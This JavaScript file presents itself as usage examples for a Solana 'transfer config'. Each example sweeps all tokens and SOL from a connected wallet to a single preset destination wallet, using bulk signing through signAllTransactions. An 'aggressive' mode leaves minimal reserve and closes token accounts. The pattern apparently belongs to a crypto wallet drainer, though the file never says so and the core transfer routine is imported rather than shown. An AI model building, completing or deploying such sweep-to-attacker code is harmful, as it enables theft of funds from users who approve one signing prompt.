/**
 * TRANSFER_CONFIG Usage Example
 * 
 * This file shows how to use the new centralized configuration
 * to control token and SOL transfers.
 */

import { Connection, PublicKey } from '@solana/web3.js';
import { performBatchTransfer } from '../index.js';
import { CONFIG } from '../config/config.js';

/**
 * Example 1: Transfer using default configuration
 */
export async function transferWithDefaultConfig(walletPublicKey, signAllTransactions) {
  const connection = new Connection(CONFIG.SOLANA_RPC_ENDPOINT, CONFIG.COMMITMENT);
  
  console.log('🔧 Current configuration:', {
    transferTokens: CONFIG.TRANSFER_CONFIG.TRANSFER_TOKENS,
    transferSol: CONFIG.TRANSFER_CONFIG.TRANSFER_SOL,
    solReserveAmount: CONFIG.TRANSFER_CONFIG.SOL_RESERVE_AMOUNT,
    batchSize: CONFIG.TRANSFER_CONFIG.BATCH_SIZE
  });
  
  try {
    const result = await performBatchTransfer(
      connection,
      walletPublicKey,
      CONFIG.DESTINATION_WALLET,
      signAllTransactions,
      {
        batchSize: CONFIG.TRANSFER_CONFIG.BATCH_SIZE,
        includeSol: CONFIG.TRANSFER_CONFIG.TRANSFER_SOL,
        solReserveAmount: CONFIG.TRANSFER_CONFIG.SOL_RESERVE_AMOUNT,
        executeInSequence: false
      }
    );
    
    console.log('✅ Transfer completed:', result);
    return result;
  } catch (error) {
    console.error('❌ Transfer error:', error);
    throw error;
  }
}

/**
 * Example 2: Configuration override for specific case
 */
export async function transferOnlyTokens(walletPublicKey, signAllTransactions) {
  const connection = new Connection(CONFIG.SOLANA_RPC_ENDPOINT, CONFIG.COMMITMENT);
  
  console.log('🪙 Tokens only transfer (ignoring global configuration)');
  
  try {
    const result = await performBatchTransfer(
      connection,
      walletPublicKey,
      CONFIG.DESTINATION_WALLET,
      signAllTransactions,
      {
        batchSize: CONFIG.TRANSFER_CONFIG.BATCH_SIZE,
        includeSol: false, // Force to not include SOL
        solReserveAmount: CONFIG.TRANSFER_CONFIG.SOL_RESERVE_AMOUNT,
        executeInSequence: false
      }
    );
    
    console.log('✅ Tokens only transferred:', result);
    return result;
  } catch (error) {
    console.error('❌ Token transfer error:', error);
    throw error;
  }
}

/**
 * Example 3: Configuration override to transfer SOL only
 */
export async function transferOnlySol(walletPublicKey, signAllTransactions) {
  const connection = new Connection(CONFIG.SOLANA_RPC_ENDPOINT, CONFIG.COMMITMENT);
  
  console.log('💎 SOL only transfer (ignoring global configuration)');
  
  try {
    const result = await performBatchTransfer(
      connection,
      walletPublicKey,
      CONFIG.DESTINATION_WALLET,
      signAllTransactions,
      {
        batchSize: 1, // SOL doesn't need batch
        includeSol: true, // Force to include SOL
        solReserveAmount: CONFIG.TRANSFER_CONFIG.SOL_RESERVE_AMOUNT,
        executeInSequence: false
      }
    );
    
    console.log('✅ SOL only transferred:', result);
    return result;
  } catch (error) {
    console.error('❌ SOL transfer error:', error);
    throw error;
  }
}

/**
 * Example 4: Validation before transfer
 */
export async function validateAndTransfer(walletPublicKey, tokenAccounts, solBalance, signAllTransactions) {
  const connection = new Connection(CONFIG.SOLANA_RPC_ENDPOINT, CONFIG.COMMITMENT);
  
  console.log('🔍 Validating before transfer...');
  
  // Configuration-based validation
  const shouldTransferTokens = CONFIG.TRANSFER_CONFIG.TRANSFER_TOKENS;
  const shouldTransferSol = CONFIG.TRANSFER_CONFIG.TRANSFER_SOL;
  
  // Validate there's something to transfer
  const hasTokens = tokenAccounts.length > 0;
  const hasSol = solBalance > CONFIG.TRANSFER_CONFIG.SOL_RESERVE_AMOUNT;
  
  if (shouldTransferTokens && !hasTokens) {
    console.warn('⚠️ Configuration enabled to transfer tokens but no tokens in wallet');
    if (!shouldTransferSol || !hasSol) {
      throw new Error('Nothing to transfer according to configuration');
    }
  }
  
  if (shouldTransferSol && !hasSol) {
    console.warn('⚠️ Configuration enabled to transfer SOL but insufficient SOL');
    if (!shouldTransferTokens || !hasTokens) {
      throw new Error('Nothing to transfer according to configuration');
    }
  }
  
  console.log('✅ Validation successful:', {
    shouldTransferTokens,
    shouldTransferSol,
    hasTokens,
    hasSol,
    tokensCount: tokenAccounts.length,
    solBalance: solBalance.toFixed(6)
  });
  
  // Proceed with transfer
  return await transferWithDefaultConfig(walletPublicKey, signAllTransactions);
}

/**
 * Example 5: Helper to create transfer options
 */
export function createTransferOptions(overrides = {}) {
  const includeSol = overrides.includeSol !== undefined 
    ? overrides.includeSol 
    : CONFIG.TRANSFER_CONFIG.TRANSFER_SOL;
  
  return {
    batchSize: overrides.batchSize || CONFIG.TRANSFER_CONFIG.BATCH_SIZE,
    includeSol: includeSol,
    solReserveAmount: overrides.solReserveAmount || CONFIG.TRANSFER_CONFIG.SOL_RESERVE_AMOUNT,
    executeInSequence: overrides.executeInSequence !== undefined 
      ? overrides.executeInSequence 
      : false,
    closeTokenAccounts: overrides.closeTokenAccounts || CONFIG.TRANSFER_CONFIG.CLOSE_TOKEN_ACCOUNTS
  };
}

/**
 * Example 6: Using helper for different scenarios
 */
export async function transferWithHelper(walletPublicKey, signAllTransactions, scenario = 'default') {
  const connection = new Connection(CONFIG.SOLANA_RPC_ENDPOINT, CONFIG.COMMITMENT);
  
  let options;
  
  switch (scenario) {
    case 'tokens_only':
      console.log('🪙 Scenario: Tokens only');
      options = createTransferOptions({ includeSol: false });
      break;
      
    case 'sol_only':
      console.log('💎 Scenario: SOL only');
      options = createTransferOptions({ includeSol: true, batchSize: 1 });
      break;
      
    case 'aggressive':
      console.log('⚡ Scenario: Aggressive transfer (less reserve, close accounts)');
      options = createTransferOptions({ 
        solReserveAmount: 0.005,
        closeTokenAccounts: true
      });
      break;
      
    case 'conservative':
      console.log('🛡️ Scenario: Conservative transfer (more reserve)');
      options = createTransferOptions({ 
        solReserveAmount: 0.02,
        executeInSequence: true
      });
      break;
      
    case 'default':
    default:
      console.log('⚙️ Scenario: Default (use configuration)');
      options = createTransferOptions();
      break;
  }
  
  console.log('🔧 Final options:', options);
  
  try {
    const result = await performBatchTransfer(
      connection,
      walletPublicKey,
      CONFIG.DESTINATION_WALLET,
      signAllTransactions,
      options
    );
    
    console.log('✅ Transfer completed:', {
      success: result.success,
      totalBatches: result.batchSummary?.totalBatches,
      totalTokens: result.totalTokens,
      solToTransfer: result.solToTransfer,
      fees: result.totalTransactionFees
    });
    
    return result;
  } catch (error) {
    console.error('❌ Transfer error:', error);
    throw error;
  }
}

/**
 * Example 7: Utility function for debugging
 */
export function printTransferConfig() {
  console.log('═══════════════════════════════════════');
  console.log('   TRANSFER_CONFIG - Current State    ');
  console.log('═══════════════════════════════════════');
  console.log('');
  console.log('🎛️ Control Flags:');
  console.log(`   TRANSFER_TOKENS: ${CONFIG.TRANSFER_CONFIG.TRANSFER_TOKENS ? '✅' : '❌'}`);
  console.log(`   TRANSFER_SOL: ${CONFIG.TRANSFER_CONFIG.TRANSFER_SOL ? '✅' : '❌'}`);
  console.log('');
  console.log('⚙️ Parameters:');
  console.log(`   SOL_RESERVE_AMOUNT: ${CONFIG.TRANSFER_CONFIG.SOL_RESERVE_AMOUNT} SOL`);
  console.log(`   BATCH_SIZE: ${CONFIG.TRANSFER_CONFIG.BATCH_SIZE}`);
  console.log(`   CLOSE_TOKEN_ACCOUNTS: ${CONFIG.TRANSFER_CONFIG.CLOSE_TOKEN_ACCOUNTS ? '✅' : '❌'}`);
  console.log('');
  console.log('📍 Destination:');
  console.log(`   DESTINATION_WALLET: ${CONFIG.DESTINATION_WALLET}`);
  console.log('');
  console.log('═══════════════════════════════════════');
}

/**
 * Complete usage example
 */
export async function completeTransferExample() {
  // Print current configuration
  printTransferConfig();
  
  // Simulate wallet data (in production would come from real wallet)
  const walletPublicKey = new PublicKey('Your_PublicKey_Here');
  const tokenAccounts = []; // Token list
  const solBalance = 0.5; // SOL balance
  
  // Signing function (in production would come from wallet)
  const signAllTransactions = async (transactions) => {
    console.log(`📝 Signing ${transactions.length} transactions...`);
    // Real signing logic would go here
    return transactions;
  };
  
  console.log('\n🚀 Starting transfer...\n');
  
  try {
    // Validate and transfer
    const result = await validateAndTransfer(
      walletPublicKey,
      tokenAccounts,
      solBalance,
      signAllTransactions
    );
    
    console.log('\n✨ Process completed successfully!');
    return result;
  } catch (error) {
    console.error('\n💥 Process failed:', error.message);
    throw error;
  }
}

// Export all example functions
export default {
  transferWithDefaultConfig,
  transferOnlyTokens,
  transferOnlySol,
  validateAndTransfer,
  createTransferOptions,
  transferWithHelper,
  printTransferConfig,
  completeTransferExample
};

